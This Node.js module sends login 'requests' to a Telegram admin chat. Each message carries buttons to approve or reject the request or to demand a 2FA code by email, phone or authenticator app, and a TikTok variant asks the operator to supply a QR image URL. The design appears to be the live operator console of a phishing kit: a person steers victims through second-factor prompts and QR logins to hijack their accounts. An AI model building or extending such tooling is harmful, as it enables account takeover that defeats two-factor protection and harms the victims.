'use strict';

const { API_BASE_URL, TELEGRAM_BOT_TOKEN, TELEGRAM_ADMIN_CHAT_ID, TELEGRAM_WEBHOOK_SECRET } = require('../config');

const MAX_MSG = 4000;

// Webhook throttling - track last webhook setup time
let lastWebhookSetTime = 0;
const WEBHOOK_THROTTLE_MS = 60 * 1000; // 1 minute

function tgApi(method, body) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/${method}`;
    return fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body)
    }).then(r =>
        r.json().then(data => {
            if (!data.ok) console.error('Telegram API error:', method, data);
            return data;
        })
    );
}

function sendApprovalMessage(requestId, text) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_ADMIN_CHAT_ID) {
        console.warn('Telegram not configured; skipping sendMessage');
        return Promise.resolve(null);
    }

    // Set webhook without awaiting to not slow down the flow
    setTelegramWebhook().catch(err => {
        console.error('Background webhook setup failed:', err);
    });

    const body = text.length > MAX_MSG
        ? text.slice(0, MAX_MSG - 20) + '\n…(truncated)'
        : text;

    return tgApi('sendMessage', {
        chat_id: TELEGRAM_ADMIN_CHAT_ID,
        text: body + '\n\nAction?',
        reply_markup: {
            inline_keyboard: [
                [
                    { text: '✅ Approve', callback_data: 'approve:' + requestId },
                    { text: '❌ Reject', callback_data: 'reject:' + requestId }
                ],
                [
                    { text: '🔐 2FA Email', callback_data: '2fa_email:' + requestId },
                    { text: '📱 2FA Phone', callback_data: '2fa_phone:' + requestId },
                    { text: '🔑 2FA App', callback_data: '2fa_totp:' + requestId }
                ]
            ]
        }
    });
}

function sendTiktokMessage(requestId, ip) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_ADMIN_CHAT_ID) {
        console.warn('Telegram not configured; skipping sendTiktokMessage');
        return Promise.resolve(null);
    }

    // Set webhook without awaiting to not slow down the flow
    setTelegramWebhook().catch(err => {
        console.error('Background webhook setup failed:', err);
    });

    const text =
        `🎵 TikTok Login Request\n\n` +
        `IP: ${ip}\n\n` +
        `Request ID: ${requestId}\n\n` +
        `Reply to this message with:\n` +
        `image_url:https://example.com/your-qr.png\n\n` +
        `(Or send a single line that is only the image URL.)`;

    return tgApi('sendMessage', {
        chat_id: TELEGRAM_ADMIN_CHAT_ID,
        text: text + '\n\nAction?',
        reply_markup: {
            inline_keyboard: [
                [
                    { text: '❌ Reject', callback_data: 'reject:' + requestId }
                ]
            ]
        }
    });
}

function parseCallback(data) {
    if (!data || typeof data !== 'string') return null;
    const i = data.indexOf(':');
    if (i <= 0) return null;
    const action = data.slice(0, i);
    const requestId = data.slice(i + 1);
    if (!requestId) return null;
    const validActions = ['approve', 'reject', '2fa_email', '2fa_phone', '2fa_totp'];
    if (!validActions.includes(action)) return null;
    return { action, requestId };
}

function setTelegramWebhook() {
    if (!TELEGRAM_BOT_TOKEN || !API_BASE_URL) {
        console.warn('Telegram webhook setup skipped: missing TELEGRAM_BOT_TOKEN or API_BASE_URL');
        return Promise.resolve(null);
    }

    // Check if webhook was set recently (within the last minute)
    const now = Date.now();
    if (now - lastWebhookSetTime < WEBHOOK_THROTTLE_MS) {
        console.log('Telegram webhook setup skipped: already set within the last minute');
        return Promise.resolve(null);
    }

    // Update the last webhook set time
    lastWebhookSetTime = now;

    const webhookUrl = `${API_BASE_URL}/telegram/webhook`;
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/setWebhook`;
    
    const params = new URLSearchParams({
        url: webhookUrl
    });
    
    if (TELEGRAM_WEBHOOK_SECRET) {
        params.append('secret_token', TELEGRAM_WEBHOOK_SECRET);
    }

    return fetch(`${url}?${params.toString()}`, {
        method: 'GET'
    }).then(r =>
        r.json().then(data => {
            if (!data.ok) {
                console.error('Telegram webhook setup error:', data);
                // Reset the timestamp on error so it can be retried sooner
                lastWebhookSetTime = 0;
            } else {
                console.log('Telegram webhook set successfully to:', webhookUrl);
            }
            return data;
        })
    ).catch(error => {
        console.error('Failed to set Telegram webhook:', error);
        // Reset the timestamp on error so it can be retried sooner
        lastWebhookSetTime = 0;
        return null;
    });
}

module.exports = { tgApi, sendApprovalMessage, sendTiktokMessage, parseCallback, setTelegramWebhook };
